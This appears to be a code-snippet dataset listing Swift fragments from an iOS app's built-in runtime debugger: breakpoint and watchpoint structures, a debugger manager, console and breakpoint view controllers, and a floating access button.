1050,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Stack frame information","public struct StackFrame {
let index: Int
let address: String
let symbol: String
let fileName: String
let lineNumber: Int
}

/// Breakpoint information
public struct Breakpoint {"
1051,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Breakpoint information","public struct Breakpoint {
let id: String
let file: String
let line: Int
let condition: String?
let actions: [BreakpointAction]
var isEnabled: Bool = true
var hitCount: Int = 0
}
"
1052,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Breakpoint action","public enum BreakpointAction {
case log(message: String)
case sound(name: String)
case command(string: String)
case script(code: String)
}

/// Watchpoint information
public struct Watchpoint {"
1053,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Watchpoint information","public struct Watchpoint {
let id: String
let address: UnsafeRawPointer
let size: Int
let condition: String?
var isEnabled: Bool = true
var hitCount: Int = 0
}

/// Exception information"
1054,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Exception information","public struct ExceptionInfo {
let name: String
let reason: String
let userInfo: [AnyHashable: Any]
let callStack: [String]
}

/// Variable information
public struct Variable {"
1055,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Variable information","public struct Variable {
let name: String
let type: String
let value: String
let summary: String
let children: [Self]?

init(name: String, type: String, value: String, summary: String, children: [Self]? = nil) {"
1056,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Command result","public struct CommandResult {
let success: Bool
let output: String
}

/// Expression evaluation result
public struct ExpressionResult {"
1057,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Expression evaluation result","public struct ExpressionResult {
let success: Bool
let value: String
let type: String
let hasChildren: Bool
}

/// Step type
public enum StepType {"
1058,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","/ Step type","public enum StepType {
case over
case into
case out
}

// MARK: - Notification Names

extension Notification.Name {"
1059,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift","MARK: - Notification Names","extension Notification.Name {
static let debuggerBreakpointHit = Notification.Name(""debuggerBreakpointHit"")
static let debuggerBreakpointAdded = Notification.Name(""debuggerBreakpointAdded"")
static let debuggerBreakpointRemoved = Notification.Name(""debuggerBreakpointRemoved"")
static let debuggerWatchpointTriggered = Notification.Name(""debuggerWatchpointTriggered"")
static let debuggerWatchpointAdded = Notification.Name(""debuggerWatchpointAdded"")
static let debuggerWatchpointRemoved = Notification.Name(""debuggerWatchpointRemoved"")
static let debuggerExceptionCaught = Notification.Name(""debuggerExceptionCaught"")
static let debuggerExecutionPaused = Notification.Name(""debuggerExecutionPaused"")
static let debuggerExecutionResumed = Notification.Name(""debuggerExecutionResumed"")"
1060,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","/ Manager class for the runtime debugger / Handles the floating button and debugger UI","public final class DebuggerManager {
// MARK: - Singleton

/// Shared instance of the debugger manager
public static let shared = DebuggerManager()

// MARK: - Properties

/// Logger for debugger operations
private let logger = Debug.shared"
1061,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","MARK: - Public Methods / Initialize the debugger / This should be called from the AppDelegate","public func initialize() {
logger.log(message: ""Initializing debugger"", type: .info)

// Show the floating button
DispatchQueue.main.async { [weak self] in"
1062,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","/ Show the debugger UI","public func showDebugger() {
guard !isDebuggerVisible else { return }"
1063,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","/ Hide the debugger UI","public func hideDebugger() {
guard isDebuggerVisible, let debuggerVC = debuggerViewController else { return }"
1064,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","/ Show the floating button","public func showFloatingButton() {
DispatchQueue.main.async { [weak self] in"
1065,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","/ Hide the floating button","public func hideFloatingButton() {
DispatchQueue.main.async { [weak self] in"
1066,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","MARK: - Private Methods","private func setupObservers() {
// Listen for button taps
NotificationCenter.default.addObserver(
self,
selector: #selector(handleShowDebugger),
name: .showDebugger,
object: nil
)

// Listen for show/hide button notifications"
1067,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","Function handleShowDebugger - implements handleshowdebugger functionality","@objc private func handleShowDebugger() {
showDebugger()
}

@objc private func handleShowFloatingButton() {"
1068,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","Function handleShowFloatingButton - implements handleshowfloatingbutton functionality","@objc private func handleShowFloatingButton() {
showFloatingButton()
}

@objc private func handleHideFloatingButton() {"
1069,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","Function handleHideFloatingButton - implements handlehidefloatingbutton functionality","@objc private func handleHideFloatingButton() {
hideFloatingButton()
}

@objc private func handleOrientationChange() {"
1070,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","Function handleOrientationChange - implements handleorientationchange functionality","@objc private func handleOrientationChange() {
// Ensure the floating button is still visible after orientation change
if floatingButton.superview != nil {"
1071,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality","@objc private func handleAppDidBecomeActive() {
// Show the floating button when app becomes active
if !isDebuggerVisible {"
1072,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","Function handleAppWillResignActive - implements handleappwillresignactive functionality","@objc private func handleAppWillResignActive() {
// No need to do anything when app resigns active
}
}

// MARK: - DebuggerViewControllerDelegate

extension DebuggerManager: DebuggerViewControllerDelegate {"
1073,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","MARK: - DebuggerViewControllerDelegate","extension DebuggerManager: DebuggerViewControllerDelegate {
func debuggerViewControllerDidRequestDismissal(_: DebuggerViewController) {"
1074,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","Function debuggerViewControllerDidRequestDismissal - implements debuggerviewcontrollerdidrequestdismissal functionality","func debuggerViewControllerDidRequestDismissal(_: DebuggerViewController) {
hideDebugger()
}
}

// MARK: - UIApplication Extension

extension UIApplication {"
1075,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","MARK: - UIApplication Extension","extension UIApplication {
private func findTopViewController(_ controller: UIViewController) -> UIViewController {"
1076,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift","Function findTopViewController - implements findtopviewcontroller functionality","private func findTopViewController(_ controller: UIViewController) -> UIViewController {
if let presentedController = controller.presentedViewController {"
1077,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","/ View controller for the breakpoints tab in the debugger","class BreakpointsViewController: UIViewController {
// MARK: - Properties

/// The debugger engine
private let debuggerEngine = DebuggerEngine.shared

/// Logger instance
private let logger = Debug.shared

/// Table view for displaying breakpoints"
1078,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupUI()
setupActions()
setupNotifications()

// Set title
title = ""Breakpoints""
"
1079,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Reload breakpoints when view appears
reloadBreakpoints()
}

// MARK: - Setup

private func setupUI() {"
1080,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","MARK: - Setup","private func setupUI() {
// Set background color
view.backgroundColor = UIColor.systemBackground

// Add table view
view.addSubview(tableView)

// Add add button
view.addSubview(addButton)
"
1081,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function setupActions - sets upactions","private func setupActions() {
// Add target for add button
addButton.addTarget(self, action: #selector(addBreakpointTapped), for: .touchUpInside)
}

private func setupNotifications() {"
1082,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function setupNotifications - sets upnotifications","private func setupNotifications() {
// Listen for breakpoint added notifications
NotificationCenter.default.addObserver(
self,
selector: #selector(handleBreakpointAdded),
name: .debuggerBreakpointAdded,
object: nil
)

// Listen for breakpoint removed notifications"
1083,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","MARK: - Actions","@objc private func addBreakpointTapped() {
// Show add breakpoint alert
let alertController = UIAlertController(
title: ""Add Breakpoint"",
message: ""Enter file path and line number"",
preferredStyle: .alert
)

// Add file text field
alertController.addTextField { textField in"
1084,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function handleBreakpointAdded - implements handlebreakpointadded functionality","@objc private func handleBreakpointAdded(_: Notification) {
// Reload breakpoints
reloadBreakpoints()
}

@objc private func handleBreakpointRemoved(_: Notification) {"
1085,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function handleBreakpointRemoved - implements handlebreakpointremoved functionality","@objc private func handleBreakpointRemoved(_: Notification) {
// Reload breakpoints
reloadBreakpoints()
}

@objc private func handleBreakpointHit(_: Notification) {"
1086,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function handleBreakpointHit - implements handlebreakpointhit functionality","@objc private func handleBreakpointHit(_: Notification) {
// Reload breakpoints to update hit counts
reloadBreakpoints()
}

// MARK: - Helper Methods

private func reloadBreakpoints() {"
1087,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","MARK: - Helper Methods","private func reloadBreakpoints() {
// Get breakpoints from debugger engine
breakpoints = debuggerEngine.getBreakpoints()

// Reload table view
tableView.reloadData()
}
}

// MARK: - UITableViewDelegate"
1088,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","MARK: - UITableViewDelegate","extension BreakpointsViewController: UITableViewDelegate {
func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {"
1089,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

// Get breakpoint
let breakpoint = breakpoints[indexPath.row]

// Show breakpoint details alert
let alertController = UIAlertController(
title: ""Breakpoint Details"",
message: ""File: \(breakpoint.file)\nLine: \(breakpoint.line)\nCondition: \(breakpoint.condition ?? ""None"")\nHit Count: \(breakpoint.hitCount)"","
1090,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat {
return 60
}
}

// MARK: - UITableViewDataSource

extension BreakpointsViewController: UITableViewDataSource {"
1091,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","MARK: - UITableViewDataSource","extension BreakpointsViewController: UITableViewDataSource {
func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {"
1092,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return breakpoints.count
}

func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
1093,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
guard let cell = tableView.dequeueReusableCell(
withIdentifier: BreakpointTableViewCell.reuseIdentifier,
for: indexPath
) as? BreakpointTableViewCell else {"
1094,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","Function tableView - implements tableview functionality","func tableView(
_: UITableView,
commit editingStyle: UITableViewCell.EditingStyle,
forRowAt indexPath: IndexPath
) {"
1095,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","MARK: - BreakpointTableViewCell","class BreakpointTableViewCell: UITableViewCell {
// MARK: - Properties

static let reuseIdentifier = ""BreakpointTableViewCell""

/// File label
private let fileLabel: UILabel = {"
1096,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","MARK: - Setup","private func setupUI() {
// Add file label
contentView.addSubview(fileLabel)

// Add line label
contentView.addSubview(lineLabel)

// Add condition label
contentView.addSubview(conditionLabel)
"
1097,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift","MARK: - Configuration","func configure(with breakpoint: Breakpoint) {
// Set file label
let fileName = (breakpoint.file as NSString).lastPathComponent
fileLabel.text = fileName

// Set line label
lineLabel.text = ""Line: \(breakpoint.line)""

// Set condition label
if let condition = breakpoint.condition {"
1098,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","/ View controller for the console tab in the debugger","class ConsoleViewController: UIViewController {
// MARK: - Properties

/// The debugger engine
private let debuggerEngine = DebuggerEngine.shared

/// Logger instance
private let logger = Debug.shared

/// Text view for displaying console output"
1099,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupUI()
setupActions()
setupNotifications()

// Set title
title = ""Console""
"
1100,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Register for keyboard notifications
NotificationCenter.default.addObserver(
self,
selector: #selector(keyboardWillShow),
name: UIResponder.keyboardWillShowNotification,
object: nil
)"
1101,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function viewWillDisappear - implements viewwilldisappear functionality","override func viewWillDisappear(_ animated: Bool) {
super.viewWillDisappear(animated)

// Unregister for keyboard notifications
NotificationCenter.default.removeObserver(
self,
name: UIResponder.keyboardWillShowNotification,
object: nil
)
"
1102,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","MARK: - Setup","private func setupUI() {
// Set background color
view.backgroundColor = UIColor.systemBackground

// Add console text view
view.addSubview(consoleTextView)

// Add command input field
view.addSubview(commandTextField)
"
1103,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function setupActions - sets upactions","private func setupActions() {
// Add target for execute button
executeButton.addTarget(self, action: #selector(executeCommand), for: .touchUpInside)

// Add target for clear button
clearButton.addTarget(self, action: #selector(clearConsole), for: .touchUpInside)

// Set text field delegate
commandTextField.delegate = self
}"
1104,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function setupNotifications - sets upnotifications","private func setupNotifications() {
// Listen for exception notifications
NotificationCenter.default.addObserver(
self,
selector: #selector(handleExceptionCaught),
name: .debuggerExceptionCaught,
object: nil
)

// Listen for breakpoint hit notifications"
1105,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","MARK: - Actions","@objc private func executeCommand() {
guard let command = commandTextField.text?.trimmingCharacters(in: .whitespacesAndNewlines),
!command.isEmpty
else {"
1106,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function clearConsole - implements clearconsole functionality","@objc private func clearConsole() {
consoleTextView.text = """"

// Add welcome message
appendToConsole(""iOS Runtime Debugger Console\n"")
appendToConsole(""Type 'help' for available commands\n"")
}

@objc private func handleExceptionCaught(_ notification: Notification) {"
1107,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function handleExceptionCaught - implements handleexceptioncaught functionality","@objc private func handleExceptionCaught(_ notification: Notification) {
guard let exceptionInfo = notification.object as? ExceptionInfo else { return }"
1108,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function handleBreakpointHit - implements handlebreakpointhit functionality","@objc private func handleBreakpointHit(_ notification: Notification) {
guard let breakpoint = notification.object as? Breakpoint else { return }"
1109,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function keyboardWillShow - implements keyboardwillshow functionality","@objc private func keyboardWillShow(_ notification: Notification) {
guard let keyboardFrame = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? CGRect else {"
1110,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function keyboardWillHide - implements keyboardwillhide functionality","@objc private func keyboardWillHide(_: Notification) {
// Reset console text view bottom constraint
let contentInsets = UIEdgeInsets.zero
consoleTextView.contentInset = contentInsets
consoleTextView.scrollIndicatorInsets = contentInsets
}

// MARK: - Helper Methods

private func appendToConsole(_ text: String) {"
1111,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","MARK: - Helper Methods","private func appendToConsole(_ text: String) {
// Add text to console
consoleTextView.text.append(text)

// Scroll to bottom
let range = NSRange(location: consoleTextView.text.count, length: 0)
consoleTextView.scrollRangeToVisible(range)
}

private func showPreviousCommand() {"
1112,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function showPreviousCommand - implements showpreviouscommand functionality","private func showPreviousCommand() {
// Update history position
if historyPosition < commandHistory.count - 1 {"
1113,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function showNextCommand - implements shownextcommand functionality","private func showNextCommand() {
// Update history position
if historyPosition > 0 {"
1114,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","MARK: - UITextFieldDelegate","extension ConsoleViewController: UITextFieldDelegate {
func textFieldShouldReturn(_: UITextField) -> Bool {"
1115,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function textFieldShouldReturn - implements textfieldshouldreturn functionality","func textFieldShouldReturn(_: UITextField) -> Bool {
executeCommand()
return true
}

func textField(_: UITextField, shouldChangeCharactersIn _: NSRange, replacementString _: String) -> Bool {"
1116,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift","Function textField - implements textfield functionality","func textField(_: UITextField, shouldChangeCharactersIn _: NSRange, replacementString _: String) -> Bool {
// Reset history position when user types
historyPosition = -1
return true
}
}
"
1117,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","/ Protocol for debugger view controller delegate","protocol DebuggerViewControllerDelegate: AnyObject {
/// Called when the debugger view controller requests dismissal
func debuggerViewControllerDidRequestDismissal(_ viewController: DebuggerViewController)
}

/// Main view controller for the debugger UI
class DebuggerViewController: UIViewController {"
1118,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","/ Called when the debugger view controller requests dismissal","func debuggerViewControllerDidRequestDismissal(_ viewController: DebuggerViewController)
}

/// Main view controller for the debugger UI
class DebuggerViewController: UIViewController {"
1119,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","/ Main view controller for the debugger UI","class DebuggerViewController: UIViewController {
// MARK: - Properties

/// Delegate for handling view controller events
weak var delegate: DebuggerViewControllerDelegate?

/// The debugger engine
private let debuggerEngine = DebuggerEngine.shared

/// Logger instance"
1120,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupNavigationBar()
setupTabBarController()

logger.log(message: ""DebuggerViewController loaded"", type: .info)
}

override func viewWillAppear(_ animated: Bool) {"
1121,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Register as delegate for debugger engine
debuggerEngine.delegate = self
}

override func viewWillDisappear(_ animated: Bool) {"
1122,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function viewWillDisappear - implements viewwilldisappear functionality","override func viewWillDisappear(_ animated: Bool) {
super.viewWillDisappear(animated)

// Unregister as delegate
if debuggerEngine.delegate === self {"
1123,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","MARK: - Setup","private func setupNavigationBar() {
// Set title
title = ""Runtime Debugger""

// Add close button
let closeButton = UIBarButtonItem(
barButtonSystemItem: .close,
target: self,
action: #selector(closeButtonTapped)
)"
1124,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function setupTabBarController - sets uptabbarcontroller","private func setupTabBarController() {
// Add tab bar controller as child view controller
addChild(debugTabBarController)
view.addSubview(debugTabBarController.view)
debugTabBarController.view.frame = view.bounds
debugTabBarController.view.autoresizingMask = [.flexibleWidth, .flexibleHeight]
debugTabBarController.didMove(toParent: self)

// Create view controllers for each tab
let consoleVC = createConsoleViewController()"
1125,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","MARK: - Tab View Controllers","private func createConsoleViewController() -> UIViewController {
return ConsoleViewController()
}

private func createBreakpointsViewController() -> UIViewController {"
1126,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function createBreakpointsViewController - creates breakpointsviewcontroller","private func createBreakpointsViewController() -> UIViewController {
return BreakpointsViewController()
}

private func createVariablesViewController() -> UIViewController {"
1127,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function createVariablesViewController - creates variablesviewcontroller","private func createVariablesViewController() -> UIViewController {
return VariablesViewController()
}

private func createMemoryViewController() -> UIViewController {"
1128,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function createMemoryViewController - creates memoryviewcontroller","private func createMemoryViewController() -> UIViewController {
return MemoryViewController()
}

private func createNetworkViewController() -> UIViewController {"
1129,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function createNetworkViewController - creates networkviewcontroller","private func createNetworkViewController() -> UIViewController {
return NetworkMonitorViewController()
}

private func createPerformanceViewController() -> UIViewController {"
1130,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function createPerformanceViewController - creates performanceviewcontroller","private func createPerformanceViewController() -> UIViewController {
return PerformanceViewController()
}

// MARK: - Actions

@objc private func closeButtonTapped() {"
1131,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","MARK: - Actions","@objc private func closeButtonTapped() {
delegate?.debuggerViewControllerDidRequestDismissal(self)
}

@objc private func pauseButtonTapped() {"
1132,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function pauseButtonTapped - implements pausebuttontapped functionality","@objc private func pauseButtonTapped() {
debuggerEngine.pause()
}

@objc private func resumeButtonTapped() {"
1133,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function resumeButtonTapped - implements resumebuttontapped functionality","@objc private func resumeButtonTapped() {
debuggerEngine.resume()
}

@objc private func stepOverButtonTapped() {"
1134,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function stepOverButtonTapped - implements stepoverbuttontapped functionality","@objc private func stepOverButtonTapped() {
debuggerEngine.stepOver()
}

@objc private func stepIntoButtonTapped() {"
1135,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function stepIntoButtonTapped - implements stepintobuttontapped functionality","@objc private func stepIntoButtonTapped() {
debuggerEngine.stepInto()
}

@objc private func stepOutButtonTapped() {"
1136,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function stepOutButtonTapped - implements stepoutbuttontapped functionality","@objc private func stepOutButtonTapped() {
debuggerEngine.stepOut()
}
}

// MARK: - DebuggerEngineDelegate

extension DebuggerViewController: DebuggerEngineDelegate {"
1137,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","MARK: - DebuggerEngineDelegate","extension DebuggerViewController: DebuggerEngineDelegate {
func debuggerEngine(_: DebuggerEngine, didHitBreakpoint breakpoint: Breakpoint) {"
1138,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function debuggerEngine - implements debuggerengine functionality","func debuggerEngine(_: DebuggerEngine, didHitBreakpoint breakpoint: Breakpoint) {
logger.log(message: ""Hit breakpoint at \(breakpoint.file):\(breakpoint.line)"", type: .info)

// Switch to breakpoints tab
DispatchQueue.main.async {"
1139,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function debuggerEngine - implements debuggerengine functionality","func debuggerEngine(
_: DebuggerEngine,
didTriggerWatchpoint watchpoint: Watchpoint,
oldValue _: Any?,
newValue _: Any?
) {"
1140,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function debuggerEngine - implements debuggerengine functionality","func debuggerEngine(_: DebuggerEngine, didCatchException exception: ExceptionInfo) {
logger.log(message: ""Caught exception: \(exception.name) - \(exception.reason)"", type: .error)

// Switch to console tab
DispatchQueue.main.async {"
1141,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function debuggerEngine - implements debuggerengine functionality","func debuggerEngine(_: DebuggerEngine, didChangeExecutionState state: ExecutionState) {
logger.log(message: ""Execution state changed to \(state)"", type: .info)

// Update UI based on execution state
DispatchQueue.main.async {"
1142,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift","Function updateUIForExecutionState - updates uiforexecutionstate","private func updateUIForExecutionState(_ state: ExecutionState) {
// Update toolbar buttons based on execution state
guard let toolbarItems = toolbarItems else { return }"
1143,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Floating button that provides quick access to the debugger","class FloatingDebuggerButton: UIButton {
// Default position values
private let defaultPosition = CGPoint(x: 60, y: 500)
private let cornerRadius: CGFloat = 25
private let buttonSize: CGFloat = 50

// Pan gesture for dragging the button
private var panGesture: UIPanGestureRecognizer?

// Logger instance"
1144,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/FloatingDebuggerButton.swift","Function setupButton - sets upbutton","private func setupButton() {
// Configure button appearance
frame = CGRect(x: 0, y: 0, width: buttonSize, height: buttonSize)
layer.cornerRadius = cornerRadius

// Shadow for better visibility
layer.shadowColor = UIColor.black.cgColor
layer.shadowOffset = CGSize(width: 0, height: 2)
